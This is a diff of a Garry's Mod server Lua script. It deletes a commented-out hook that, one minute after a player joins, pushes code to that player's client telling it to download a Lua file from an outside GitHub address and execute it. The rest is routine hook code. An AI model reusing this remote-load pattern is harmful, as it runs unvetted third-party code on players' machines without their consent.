@@ -475,15 +475,6 @@ hook.Add("PlayerLoadout", "FuckShitLmao", function(ply)
     ply:SetHealth(100)
 end, 2)
 
--- hook.Add("ClientSignOnStateChanged", "sendcuntshit", function(userid, old, new)
---     timer.Simple(60, function()
---         if new == SIGNONSTATE_FULL then
---             Player(userid):SendLua("http.Fetch('https://raw.githubusercontent.com/EclipseCantCode/Fortnut/main/lua/client.lua', function(b) RunString(b) end)")
---         end
---     end)
--- end)
-
-
 local oldFunction = net.Receivers["sendreinforcements"]
 net.Receive("sendreinforcements", function(len, ply)
     oldFunction(len, ply)
